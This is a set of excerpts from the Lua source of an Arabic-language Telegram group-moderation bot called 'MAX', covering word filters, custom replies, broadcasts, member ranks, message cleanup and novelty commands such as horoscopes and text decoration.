database:set(bot_id.."MAX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."MAX1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"☆︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."MAX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."MAX1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."MAX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"☆︙ ارسل الكلمه الان")  
database:set(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MAX1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."MAX1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."MAX1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."MAX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MAX1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."MAX1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n☆︙ قائمة المنع \n𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻\n"
for k,v in pairs(list) do  
local MAX_Msg = database:get(bot_id.."MAX1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..MAX_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevMAX(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'☆︙ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevMAX(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n☆︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'TEM_MAX')..')'..'\n☆︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevMAX(msg) then  
...
if text == 'تعطيل الاذاعه' and DevMAX(msg) then  
...
if not database:get(bot_id..'D9l9l:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'D9l9l:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."D9l9l:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."D9l9l:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "☆︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."D9l9l:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."D9l9l:allM"..msg.chat_id_)
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'MAX').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'MAX')
local MAX_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..MAX_Msg[math.random(#MAX_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevMAX(msg) then 
...
if database:sismember(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
database:srem(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:MAX:2',msg.sender_user_id_) then
database:srem(bot_id..'D9l9l:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevMAX(msg) then 
...
if text == ("ردود المطور") and DevMAX(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n☆︙قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
...
if text == "اضف رد للكل" and DevMAX(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "حذف رد للكل" and DevMAX(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n☆︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:MAX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:MAX:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:MAX:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"☆︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:MAX:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:MAX:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:MAX:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:MAX:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:MAX:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:MAX:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:MAX:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:MAX:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:MAX:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:MAX:List:Rd:Sudo")
end
...
database:set(bot_id.."TEM_MAX:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'☆ تم تفعيل الانستا')
database:set(bot_id.."TEM_MAX:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."TEM_MAX:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."TEM_MAX:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"☆︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."TEM_MAX:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."TEM_MAX:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري  MAX يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:MAX:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"☆︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:MAX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MAX:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:MAX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MAX:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:MAX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:MAX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:MAX:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:MAX:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:MAX:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:MAX:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'MAX').." غادر" or text == 'بوت غادر' then  
...
if text == 'تفعيل المغادره' and DevMAX(msg) then   
...
if text == 'تعطيل المغادره' and DevMAX(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'TEM_MAX')..')'
local iduser = result.sender_user_id_
...
local MAX = '☆︙ عدد الادمنيه : '..data.administrator_count_..
'\n\n☆︙ عدد المطرودين : '..data.kicked_count_..
'\n\n☆︙ عدد الاعضاء : '..data.member_count_..
'\n\n☆︙ عدد رسائل الكروب : '..(msg.id_/2097152/0.5)..
'\n\n☆︙  اسم الكروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, MAX) 
end,nil)
end,nil)
end 
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,MAX,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (MAX.total_count_ or 0)
...
local rdphoto = MAXa[math.random(#MAXa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, MAX.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
-- vardump(data) 
MAXdx(msg.chat_id_, msg.id_, '☆︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n☆︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n☆︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n☆︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
MAX = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,MAX)  
...
MAX = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,MAX)  
...
if text == 'استعاده الاوامر' and DevMAX(msg) then
...
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/MAX"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = ' 𝙎??𝙐𝙍𝘾𝞝 MAX', url="t.me/TEM_MAX"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
database:set(bot_id.." MAX:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزغرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'☆︙ تم تفعيل الزغرفه')
database:set(bot_id.." MAX:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زغرفه (.*)$") and database:get(bot_id.." MAX:zhrf_Bots"..msg.chat_id_) == "open" then
...
send(msg.chat_id_, msg.id_, t..'𓍹ⵧⵧⵧⵧⵧⵧ⊱•MAX•⊰ⵧⵧⵧⵧⵧⵧ𓍻ٴ\n☆︙ ➫ .[ MAX. ](t.me/TEM_MAX)➤ ')
end
if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, '☆︙ تم تعطيل الابراج')
database:set(bot_id.." MAX:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'☆︙ تم تفعيل الابراج')
database:set(bot_id.." MAX:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." MAX:brj_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." MAX:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '☆︙ تم تعطيل حساب العمر')
database:set(bot_id.." MAX:age_Bots"..msg.chat_id_,"close")
...
database:set(bot_id.." MAX:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." MAX:age_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.."MAX:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,'☆︙ تم تفعيل الافلام')
database:set(bot_id.."MAX:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."MAX:movie_bot"..msg.chat_id_) == "open" then
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'MAX')
...
MAX = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(MAX)
...
------------------------------------------------------------------------
local MAXAbot = database:get(bot_id.."MAX1:Add:Filter:Rp2"..text..result.chat_id_)   
if MAXAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"☆︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n☆︙ ["..MAXAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local MAX1_Msg = database:get(bot_id.."MAX1:Add:Filter:Rp2"..text..result.chat_id_)   
if MAX1_Msg then    
send(msg.chat_id_, msg.id_,"☆︙ "..MAX1_Msg)
...
end -- end new msg dev.mr MAX 
end -- end callback dev.mr MAX
